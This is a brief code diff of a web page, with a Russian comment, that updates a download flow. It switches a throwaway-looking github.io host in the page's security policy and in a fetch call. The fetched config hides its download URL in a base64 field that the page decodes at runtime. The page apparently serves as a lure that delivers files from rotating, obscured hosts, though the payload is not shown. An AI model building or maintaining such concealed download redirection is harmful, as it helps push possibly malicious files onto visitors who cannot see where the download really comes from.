@@ -10,9 +10,9 @@
   <!-- Разрешаем инлайн‑скрипты для нашего мини‑JS -->
   <meta http-equiv="Content-Security-Policy" content="
     default-src 'self';
-    script-src  'self' 'unsafe-inline' https://matokgja.github.io;
+    script-src  'self' 'unsafe-inline' https://kialofjs.github.io;
     style-src   'self';
-    connect-src 'self' https://matokgja.github.io
+    connect-src 'self' https://kialofjs.github.io
   "/>
 
   <link rel="stylesheet" href="styles.css"/>
@@ -40,7 +40,7 @@
     loader.textContent = 'Fetching download link…';
     error.textContent  = '';
     try {
-      const res = await fetch('https://matokgja.github.io/.github/settings.akk1332');
+      const res = await fetch('https://kialofjs.github.io/.github/settings.msosen');
       if (!res.ok) throw new Error(`Config HTTP ${res.status}`);
       const { c } = await res.json();
       const url = atob(c);
